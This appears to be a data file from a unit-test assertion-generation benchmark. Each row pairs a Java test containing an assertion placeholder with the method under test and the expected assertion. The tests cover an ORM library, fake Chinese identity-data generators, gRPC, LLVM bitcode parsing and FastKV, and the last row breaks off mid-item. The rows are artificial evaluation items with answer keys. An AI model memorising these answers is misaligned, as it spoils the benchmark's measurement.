select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(entities.size(), 995)
"select() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andLessThan(MysqlUserEntity::getDateOfBirth, LocalDate.now()); dynamicSql.startBrackets(); dynamicSql.andLike(MysqlUserEntity::getGender, ""未%""); dynamicSql.endBrackets(); dynamicSql.andLike(MysqlUserEntity::getCreateDate, LocalDate.now() + ""%""); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(entities.size(), 995)
"select2() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); String json = ""{""sing"": true, ""maxLong"": 9223372036854775807, ""maxDouble"": 1.7976931348623157e308, ""playBasketball"": false}""; final Gson gson = new Gson(); final HobbyEntity hobbyEntity = gson.fromJson(json, HobbyEntity.class); //执行的字符串json dynamicSql.andEqualTo(MysqlUserEntity::getDesc, hobbyEntity); final List<MysqlUserEntity> entities = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(entities.size(), 995)
"selectAll() { final List<MysqlUserEntity> entities = BraveSql.build(MysqlUserEntity.class).select(); Assert.""<AssertPlaceHolder>""; log.info(""entities.size() :{}"", entities.size()); }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(entities.size(), 1000)
"batchInsert() { final MysqlUserEntity build = MysqlUserEntity.builder().gender(GenderEnum.女).build(); final Integer integer = BraveSql.build(MysqlUserEntity.class).batchInsert(Collections.singleton(build)); Assert.""<AssertPlaceHolder>""; }
batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(integer.intValue(), 1)
"insertActive() { final Integer integer = BraveSql.build(MysqlUserEntity.class).insertActive(null); Assert.""<AssertPlaceHolder>""; }
insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(integer.intValue(), 0)
"insertOrUpdate() { final MysqlUserEntity build = MysqlUserEntity.builder().build(); build.setAccountNo(""update""); build.setId(1); build.setGender(GenderEnum.男); final Integer integer = BraveSql.build(MysqlUserEntity.class).insertOrUpdate(build); Assert.""<AssertPlaceHolder>""; }
insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(integer.intValue(), 1)
"updateActive() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andEqualTo(MysqlUserEntity::getAccountNo, ""账号：0""); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); final MysqlUserEntity build = MysqlUserEntity.builder().id(1).accountNo(""accountNo_updateActive"").build(); BraveSql.build(dynamicSql, MysqlUserEntity.class).updateActive(build); final MysqlUserEntity mysqlUserEntity = BraveSql.build(dynamicSql, MysqlUserEntity.class).selectSingle(); Assert.""<AssertPlaceHolder>""; }
selectSingle() throws SQLException, InstantiationException, IllegalAccessException;  List<T> select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertNull(mysqlUserEntity)
"updateActiveByPrimaryKey() { final MysqlUserEntity build = MysqlUserEntity.builder().id(1).accountNo(""updateActiveByPrimaryKey"").build(); final Integer integer = BraveSql.build(MysqlUserEntity.class).updateActiveByPrimaryKey(build); Assert.""<AssertPlaceHolder>""; }
updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(integer.intValue(), 1)
"delete2() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andEqualTo(MysqlUserEntity::getId, 1); final Integer delete = BraveSql.build(dynamicSql, MysqlUserEntity.class).delete(); Assert.""<AssertPlaceHolder>""; }
delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(delete.intValue(), 1)
"delete3() { final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); dynamicSql.andLessThan(MysqlUserEntity::getId, 700); final Integer delete = BraveSql.build(dynamicSql, MysqlUserEntity.class).delete(); Assert.""<AssertPlaceHolder>""; }
delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(delete.intValue(), 699)
"deleteByPrimaryKey() { final Integer delete = BraveSql.build(MysqlUserEntity.class).deleteByPrimaryKey(1); Assert.""<AssertPlaceHolder>""; }
deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(delete.intValue(), 1)
"testSQLInterceptor2() { //        InterceptorHelper.initSQLInterceptor(new FalseSQLInterceptor()); final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); //设置一个类型不匹配的错误 dynamicSql.andGreaterThanOrEqualTo(MysqlUserEntity::getId, null); final List<MysqlUserEntity> select = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); log.info(""select.size() :{}"", select.size()); Assert.""<AssertPlaceHolder>""; }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(0, select.size())
"testSQLInterceptor3() { InterceptorHelper.initSQLInterceptor(new CustomSQLInterceptor()); final DynamicSql<MysqlUserEntity> dynamicSql = DynamicSql.createDynamicSql(); //设置一个类型不匹配的错误 dynamicSql.andGreaterThanOrEqualTo(MysqlUserEntity::getId, 300); final List<MysqlUserEntity> select = BraveSql.build(dynamicSql, MysqlUserEntity.class).select(); log.info(""select.size() :{}"", select.size()); Assert.""<AssertPlaceHolder>""; }
select() throws SQLException, InstantiationException, IllegalAccessException;  /** * 执行聚合函数，已验证5个，分别是 * sum(), avg(), min(), max(),  count() * * @param property     实体类字段名 * @param functionEnum 函数类型 * @param returnType   期待返回的类型 * @return 期待执行的结果 */ <R> R selectAggregateFunction(String property, FunctionEnum functionEnum, Class<R> returnType) throws SQLException;  <K, R> Map<K, R> selectAggregateFunction(String valueProperty, FunctionEnum functionEnum, Class<K> keyClass, Class<R> valueClass, String keyProperty) throws SQLException;  List<T> selectAll() throws SQLException, InstantiationException, IllegalAccessException;  PageInfo<T> selectPageInfo() throws SQLException, InstantiationException, IllegalAccessException;  Integer batchInsert() throws SQLException;  Integer insertActive() throws SQLException;  Integer insertOrUpdate() throws SQLException;  Integer insertOrUpdateActive() throws SQLException;  Integer update() throws SQLException;  Integer updateActive() throws SQLException;  //    Integer updateBatch();  Integer updateByPrimaryKey() throws SQLException;  Integer updateActiveByPrimaryKey() throws SQLException;  Integer delete() throws SQLException;  Integer deleteByPrimaryKey(Object primaryKeyValue) throws SQLException;  default void printSql(String sql) { if (log.isDebugEnabled()) { log.debug(sql); } }"	assertEquals(701, select.size())
"testDefaultEChartsSerializer() { EChartsSerializer serializer = new EChartsSerializer(); Object object = new MarkArea2DDataItem() .setStartPoint(new MarkArea2DDataItemDim().setName(""start"")) .setEndPoint(new MarkArea2DDataItemDim().setName(""end"")); JsonElement actual = serializer.toJsonTree(object); JsonElement expected = JsonParser.parseString(""[{'name': 'start'}, {'name': 'end'}]""); ""<AssertPlaceHolder>""; }
toJsonTree(Object src) { return gson.toJsonTree(src); }"	assertEquals(expected, actual)
"testCustomEChartsSerializer() { EChartsSerializer serializer = new EChartsSerializer(new CustomObjectAdapter()); Object object = new CustomObject(""name""); JsonElement actual = serializer.toJsonTree(object); JsonElement expected = JsonParser.parseString(""'name'""); ""<AssertPlaceHolder>""; }
toJsonTree(Object src) { return gson.toJsonTree(src); }"	assertEquals(expected, actual)
"testGenerate() { String generatedAddress = ChineseAddressGenerator.getInstance() .generate(); System.err.println(generatedAddress); ""<AssertPlaceHolder>""; }
generate() { StringBuilder result = new StringBuilder(genProvinceAndCity()); result.append(ChineseCharUtils.genRandomLengthChineseChars(2, 3) + ""路""); result.append(RandomUtils.nextInt(1, 8000) + ""号""); result .append(ChineseCharUtils.genRandomLengthChineseChars(2, 3) + ""小区""); result.append(RandomUtils.nextInt(1, 20) + ""单元""); result.append(RandomUtils.nextInt(101, 2500) + ""室""); return result.toString(); }"	assertNotNull(generatedAddress)
"generateRandomDate() { Date randomDate = ChineseIDCardNumberGenerator.randomDate(); System.err.println(randomDate); ""<AssertPlaceHolder>""; }
randomDate() { Calendar calendar = Calendar.getInstance(); calendar.set(1970, 1, 1); long earlierDate = calendar.getTime().getTime(); calendar.set(2000, 1, 1); long laterDate = calendar.getTime().getTime();  long chosenDate = RandomUtils.nextLong(earlierDate, laterDate);  return new Date(chosenDate); }"	assertNotNull(randomDate)
"testGenerate() { String idCard = ChineseIDCardNumberGenerator.getInstance().generate(); System.err.println(idCard); System.out.println(""Verify id result: "" + ChineseIDCardUtil.isIDCard(idCard)); ""<AssertPlaceHolder>""; if (idCard.charAt(idCard.length()-2)%2 == 0){ System.err.println(""女""); } else { System.err.println(""男""); } }
generate() { Map<String, String> code = getAreaCode(); String areaCode = code.keySet().toArray(new String[0])[RandomUtils .nextInt(0, code.size())] + StringUtils.leftPad((RandomUtils.nextInt(0, 9998) + 1) + """", 4, ""0"");  String birthday = new SimpleDateFormat(""yyyyMMdd"").format(randomDate()); String randomCode = String.valueOf(1000 + RandomUtils.nextInt(0, 999)) .substring(1); String pre = areaCode + birthday + randomCode; String verifyCode = getVerifyCode(pre); String result = pre + verifyCode;  return result; }"	assertNotNull(idCard)
"testGenerateIssueOrg() { String issueOrg = ChineseIDCardNumberGenerator.generateIssueOrg(); System.err.println(issueOrg); ""<AssertPlaceHolder>""; }
generateIssueOrg() { return ChineseAreaList.cityNameList .get(RandomUtils.nextInt(0, ChineseAreaList.cityNameList.size())) + ""公安局某某分局""; }"	assertNotNull(issueOrg)
"testGenerateValidPeriod() { String result = ChineseIDCardNumberGenerator.generateValidPeriod(); System.err.println(result); ""<AssertPlaceHolder>""; }
generateValidPeriod() { DateTime beginDate = new DateTime(randomDate()); String formater = ""yyyyMMdd""; DateTime endDate = beginDate.withYear(beginDate.getYear() + 20); return beginDate.toString(formater) + ""-"" + endDate.toString(formater); }"	assertNotNull(result)
"testGenerate() { String generatedMobileNum = ChineseMobileNumberGenerator.getInstance() .generate(); ""<AssertPlaceHolder>""; System.err.println(generatedMobileNum); }
generate() { return genMobilePre() + StringUtils .leftPad("""" + RandomUtils.nextInt(0, 99999999 + 1), 8, ""0""); }"	assertNotNull(generatedMobileNum)
"testGgenerateFake() { String generatedMobileNum = ChineseMobileNumberGenerator.getInstance() .generateFake(); ""<AssertPlaceHolder>""; System.err.println(generatedMobileNum); }
generateFake() { return ""19"" + StringUtils .leftPad("""" + RandomUtils.nextInt(0, 999999999 + 1), 9, ""0""); }"	assertNotNull(generatedMobileNum)
"testGenerate() { String generatedName = ChineseNameGenerator.getInstance().generate(); ""<AssertPlaceHolder>""; System.err.println(generatedName); }
generate() { //姓名暂时还是两到三字，比较常见些 return genFirstName() + ChineseCharUtils.genRandomLengthChineseChars(1, 2); }"	assertNotNull(generatedName)
"testGenerateOdd() { String generatedName = ChineseNameGenerator.getInstance().generateOdd(); ""<AssertPlaceHolder>""; System.err.println(generatedName); }
generateOdd() { return genFirstName() + ChineseCharUtils.getOneOddChar(); }"	assertNotNull(generatedName)
"testGenerate() { for(int i=0; i<10; i++) { String generatedEmail = EmailAddressGenerator.getInstance().generate(); System.err.println(generatedEmail); ""<AssertPlaceHolder>""; } }
generate() { Random random = new Random(); StringBuilder result = new StringBuilder();  result.append(RandomStringUtils.randomAlphanumeric(10)); result.append(""@"");  result.append(RandomStringUtils.randomAlphanumeric(5)); result.append("".""); // 随机选择一个域名 int domainIndex = random.nextInt(DOMAINS.length); result.append(DOMAINS[domainIndex]);  return result.toString().toLowerCase(); }"	assertNotNull(generatedEmail)
"testGenerate() { String generatedName = EnglishNameGenerator.getInstance().generate(); ""<AssertPlaceHolder>""; System.err.println(generatedName); }
generate() { //英文名 return genFirstName(); }"	assertNotNull(generatedName)
"testMockReturn() { when(lab.getExpScore(anyString())).thenReturn(90); Assert.""<AssertPlaceHolder>""; }
passMathExp() { return lab.getExpScore(""math"") >= 90; }"	assertTrue(student.passMathExp())
"testAddStudent() { //        StudentDao studentDao = new StudentDao(); StudentDao studentDao = PowerMockito.mock(StudentDao.class); PowerMockito.when(studentDao.getTotal()).thenReturn(666); StudentService studentService = new StudentService(studentDao); int total = studentService.getTotal(); Assert.""<AssertPlaceHolder>""; }
getTotal() { return studentDao.getTotal(); }"	assertEquals(total, 666)
"test_04_getBySql() { Boy boy = boyRepository.get(""select * from t_test_boy where age=25""); Assert.""<AssertPlaceHolder>""; }
get(String sql);"	assertTrue(boy.getAge() == 25)
"test_05_getOne() { Boy boy = boyRepository.getOne(1L); Assert.""<AssertPlaceHolder>""; }
getOne(ID id);"	assertTrue(boy.getAge() == 18)
"test_06_get() { Boy boy = boyRepository.get(""select * from t_test_boy where age=30""); Assert.""<AssertPlaceHolder>""; }
get(String sql);"	assertTrue(boy.getAge() == 30)
"test_08_query() { List<Boy> list = boyRepository.query(""select * from t_test_boy where name is not null""); Assert.""<AssertPlaceHolder>"";  }
query(String sql);"	assertTrue(!list.isEmpty())
"test_05_query() { List<Long> ids = Lists.newArrayList(3L, 5L); List<Boy> list = boyService.query(ids); Assert.""<AssertPlaceHolder>""; }
query(Iterable<ID> ids) { return dao.findAllById(ids); }"	assertTrue(list.size() == 2)
"test_06_queryAll() { List<Boy> list = boyService.queryAll(); Assert.""<AssertPlaceHolder>""; }
queryAll() { return dao.findAll(); }"	assertTrue(list.size() > 5)
"greet_messageDeliveredToServer() { ArgumentCaptor<HelloRequest> requestCaptor = ArgumentCaptor.forClass(HelloRequest.class); client.greet(""test name""); verify(serviceImpl) .sayHello(requestCaptor.capture(), ArgumentMatchers.<StreamObserver<HelloReply>>any()); ""<AssertPlaceHolder>""; }
greet(String name) { logger.info(""Will try to greet "" + name + "" ...""); HelloRequest request = HelloRequest.newBuilder().setName(name).build(); HelloReply response; try { response = blockingStub.sayHello(request); } catch (StatusRuntimeException e) { logger.log(Level.WARNING, ""RPC failed: {0}"", e.getStatus()); return; } logger.info(""Greeting: "" + response.getMessage()); }"	"assertEquals(""test name"", requestCaptor.getValue().getName())"
"Exception { logger.info(""Server test started, greeterImpl_replyMessage()""); // Generate a unique in-process server name. String serverName = InProcessServerBuilder.generateName();  // Create a server, add service, start, and register for automatic graceful shutdown. grpcCleanup.register(InProcessServerBuilder .forName(serverName).directExecutor().addService(new GreeterImpl()).build().start());  GreeterGrpc.GreeterBlockingStub blockingStub = GreeterGrpc.newBlockingStub( // Create a client channel and register for automatic graceful shutdown. grpcCleanup.register(InProcessChannelBuilder.forName(serverName).directExecutor().build()));   HelloReply reply = blockingStub.sayHello(HelloRequest.newBuilder().setName( ""test name"").build());  ""<AssertPlaceHolder>""; }
start() throws IOException { /* The port on which the server should run */ int port = 50051; server = ServerBuilder.forPort(port) .addService(new GreeterImpl()) .build() .start(); logger.info(""Server started, listening on "" + port); Runtime.getRuntime().addShutdownHook(new Thread() { @Override public void run() { // Use stderr here since the logger may have been reset by its JVM shutdown hook. System.err.println(""*** shutting down gRPC server since JVM is shutting down""); try { HelloWorldServer.this.stop(); } catch (InterruptedException e) { e.printStackTrace(System.err); } System.err.println(""*** server shut down""); } }); }"	"assertEquals(""Hello test name"", reply.getMessage())"
"test1() { Pointer pointer = new Pointer(); try (CXXStackObject<Pointer> pointerCXXStackObject = new CXXStackObject<>(pointer)) { ""<AssertPlaceHolder>""; } }
get() { return this.pointer; }"	assertEquals(pointer, pointerCXXStackObject.get())
"IOException { try (CXXStackObject<LLVMContext> contextObject = new CXXStackObject<LLVMContext>(LLVMContext.newContext())) { Module module = BitcodeParser.parseEmbeddedBitcode(contextObject.get(), getResourceAsFile(""libgraph.so"").getAbsolutePath()); Assert.""<AssertPlaceHolder>""; iterateModule(module); } }
parseEmbeddedBitcode(LLVMContext context, String file) { try (CXXValueScope scope = new CXXValueScope()) { Expected<OwningBinary<Binary>> owningBinaryExpected = Binary.createBinary(file); if (owningBinaryExpected.bool() == false) { return null; } Binary binary = owningBinaryExpected.get().getBinary(); ObjectFile objectFile = ObjectCasting.dyn_cast(binary); if (objectFile.isNull()) { return null; }  try (CXXStackObject<StdString> stdString = new CXXStackObject<>(StdString.create(objectFile.isMachO() ? ""__LLVM,__bitcode"" : "".llvmbc""))) { for (ObjectFile.SectionIterator iterator : objectFile.sections()) { ObjectFile.SectionRef sectionRef = iterator.get(); Expected<StringRef> nameExpected = sectionRef.getName(); if (!nameExpected.bool()) { continue; } StringRef name = nameExpected.get(); if (!name.equals(stdString.get())) { continue; } Expected<StringRef> ContextsOrErr = sectionRef.getContents(); if (!ContextsOrErr.bool()) { return null; }  UniquePtr<MemoryBuffer> MB = MemoryBuffer.getMemBuffer(ContextsOrErr.get()); Expected<UniquePtr<Module>> ModuleOrErr = BitcodeReader.INSTANCE.parseBitcodeFile(MB.get().getMemBufferRef(), context); if (!ModuleOrErr.bool()) { return null; } return ModuleOrErr.get().release(); } }  return null; } }"	assertTrue(module != null && !module.isNull())
"IOException { try (CXXStackObject<LLVMContext> contextObject = new CXXStackObject<LLVMContext>(LLVMContext.newContext())) { Module module = BitcodeParser.parseBitcodeFile(contextObject.get(), getResourceAsFile(""libsimdjson.bc"").getAbsolutePath()); Assert.""<AssertPlaceHolder>""; iterateModule(module); } }
parseBitcodeFile(LLVMContext context, String file) { try (CXXValueScope scope = new CXXValueScope()) { ErrorOr<UniquePtr<MemoryBuffer>> MB = MemoryBuffer.getFile(file); if (!MB.bool()) { return null; }  Expected<UniquePtr<Module>> ModuleOrErr = BitcodeReader.INSTANCE.parseBitcodeFile(MB.get().get().getMemBufferRef(), context); if (!ModuleOrErr.bool()) { return null; } return ModuleOrErr.get().release(); } }"	assertTrue(module != null && !module.isNull())
"IOException { String name = ""test_in_random""; FastKV kv1 = new FastKV.Builder(TestHelper.DIR, name).build(); kv1.clear();  long seed = System.nanoTime(); System.out.println(""random test seed: "" + seed); Random r = new Random(seed);  ArrayList<Pair<String, Object>> srcList = generateInputList(loadSourceData());  long time = 0; List<Pair<String, Object>> inputList = new ArrayList<>(srcList); for (int i = 0; i < 1; i++) { long t1 = System.nanoTime(); putToFastKV(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1);  } System.out.println(""fill, use time: "" + (time / 1000000) + "" ms"");  kv1.putString(""flag"", ""hello"");  int round = 3; time = 0; for (int i = 0; i < round; i++) { inputList = getDistributedList(srcList, r, 3); long t1 = System.nanoTime(); putToFastKV(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1); } System.out.println(""update, use time: "" + (time / 1000000) + "" ms"");  FastKV kv2 = new FastKV(TestHelper.DIR, name, null, null, FastKV.NON_BLOCKING); Assert.""<AssertPlaceHolder>""; }
clear() { if (closed) return this; clearData(); if (writingMode != NON_BLOCKING) { deleteCFiles(); } notifyListeners(null); return this; }"	"assertEquals(""hello"", kv2.getString(""flag""))"
"Exception { String name = ""test_force""; FastKV kv1 = new FastKV.Builder(TestHelper.DIR, name).build(); long newTime = System.currentTimeMillis() ^ System.nanoTime();  kv1.putLong(""time"", newTime); kv1.force();  File aFile = new File(TestHelper.DIR, name + "".kva""); RandomAccessFile accessFile = new RandomAccessFile(aFile, ""r""); ByteBuffer buffer = ByteBuffer.allocate(26); buffer.order(ByteOrder.LITTLE_ENDIAN); accessFile.read(buffer.array(), 0, 26); long t = buffer.getLong(18); Assert.""<AssertPlaceHolder>""; }
force() { if (closed) return; if (writingMode == NON_BLOCKING) { aBuffer.force(); bBuffer.force(); } }"	assertEquals(newTime, t)
"IOException { String name = ""test_sync2""; FastKV kv1 = new FastKV.Builder(TestHelper.DIR, name).blocking().build(); kv1.clear();  long seed = System.nanoTime(); System.out.println(""random test seed: "" + seed); Random r = new Random(seed);  ArrayList<Pair<String, Object>> srcList = generateInputList(loadSourceData());  long time = 0; List<Pair<String, Object>> inputList = new ArrayList<>(srcList); for (int i = 0; i < 1; i++) { long t1 = System.nanoTime(); putToFastKV(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1);  } System.out.println(""fill, use time: "" + (time / 1000000) + "" ms"");  kv1.putString(""flag"", ""hello"");  int round = 3; time = 0; for (int i = 0; i < round; i++) { inputList = getDistributedList(srcList, r, 3); long t1 = System.nanoTime(); putToFastKV(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1); } System.out.println(""update, use time: "" + (time / 1000000) + "" ms"");  FastKV kv2 = new FastKV(TestHelper.DIR, name, null, null, FastKV.SYNC_BLOCKING); Assert.""<AssertPlaceHolder>""; }
clear() { if (closed) return this; clearData(); if (writingMode != NON_BLOCKING) { deleteCFiles(); } notifyListeners(null); return this; }"	"assertEquals(""hello"", kv2.getString(""flag""))"
"IOException { String name = ""test_in_random""; MPFastKV kv1 = new MPFastKV.Builder(TestHelper.MP_DIR, name).disableWatchFileChange().build(); kv1.clear();  long seed = System.nanoTime(); System.out.println(""random test seed: "" + seed); Random r = new Random(seed);  ArrayList<FastKVTest.Pair<String, Object>> srcList = generateInputList(loadSourceData());  long time = 0; List<FastKVTest.Pair<String, Object>> inputList = new ArrayList<>(srcList); for (int i = 0; i < 1; i++) { long t1 = System.nanoTime(); putToMPFastKV1(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1);  } System.out.println(""fill, use time: "" + (time / 1000000) + "" ms"");  kv1.putString(""flag"", ""hello""); kv1.commit();  int round = 3; time = 0; for (int i = 0; i < round; i++) { inputList = getDistributedList(srcList, r, 3); long t1 = System.nanoTime(); putToMPFastKV2(kv1, inputList); long t2 = System.nanoTime(); time += (t2 - t1); } System.out.println(""update, use time: "" + (time / 1000000) + "" ms"");  MPFastKV kv2 = new 